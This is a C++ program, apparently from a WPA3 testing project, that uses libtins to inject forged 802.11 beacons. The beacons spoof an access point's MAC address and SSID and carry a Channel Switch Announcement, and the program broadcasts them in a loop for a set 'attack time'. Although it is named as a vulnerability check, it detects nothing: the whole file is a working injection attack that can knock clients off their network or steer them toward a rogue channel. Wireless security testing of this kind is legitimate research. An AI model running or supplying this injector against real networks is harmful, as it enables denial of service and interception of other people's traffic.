#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

void send_CSA_beacon(const HWAddress<6> &ap_mac,
                     const NetworkInterface &iface,
                     const string &ssid,
                     const int ap_channel,
                     const int new_channel
){
    Dot11Beacon beacon;
    beacon.addr1(Dot11::BROADCAST);
    beacon.addr2(ap_mac);
    beacon.addr3(ap_mac);
    beacon.ssid(ssid);
    beacon.ds_parameter_set(ap_channel);

    Dot11ManagementFrame::channel_switch_type cs;
    cs.switch_mode = 1;
    cs.new_channel = new_channel;
    cs.switch_count = 3;
    beacon.channel_switch(cs);

    RadioTap radiotap;
    const int freq_mhz = wpa3_tester::hw_capabilities::channel_to_freq(ap_channel);
    radiotap.channel(freq_mhz, RadioTap::OFDM);
    radiotap.inner_pdu(beacon);

    PacketSender sender;
    sender.send(radiotap, iface);
}

void check_vulnerable(
    const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
    const string &iface_name, const string &ssid,
    const int ap_channel, const int new_channel,
    const int ms_interval, const int attack_time
){
    const NetworkInterface iface(iface_name);
    const auto start_time = steady_clock::now();
    const auto end_time = start_time + seconds(attack_time);

    while(steady_clock::now() < end_time){
        send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
        this_thread::sleep_for(milliseconds(ms_interval));
    }

    cout << "check_vulnerable called with:\n"
            << "AP MAC: " << ap_mac << "\n"
            << "STA MAC: " << sta_mac << "\n"
            << "Interface: " << iface_name << "\n"
            << "Channel: " << ap_channel << "\n"
            << "SSID: " << ssid << endl;
}

int main(const int argc, char *argv[]){
    if(argc != 9){
        cout << "Usage: " << argv[0] <<
                " <ap_mac> <sta_mac> <iface_name> <ssid> <ap_channel> <new_channel> <ms_interval> <attack_time>" <<
                endl;
        cout << "Example: " << argv[0] << " 00:11:22:33:44:55 aa:bb:cc:dd:ee:ff wlan0 test ssid 6 11 100 10" << endl;
        return 1;
    }

    const HWAddress<6> ap_mac(argv[1]);
    const HWAddress<6> sta_mac(argv[2]);
    const string iface_name = argv[3];
    const string ssid = argv[4];
    const int ap_channel = stoi(argv[5]);
    const int new_channel = stoi(argv[6]);
    const int ms_interval = stoi(argv[7]);
    const int attack_time = stoi(argv[8]);

    check_vulnerable(ap_mac, sta_mac, iface_name, ssid, ap_channel, new_channel, ms_interval, attack_time);

    return 0;
}
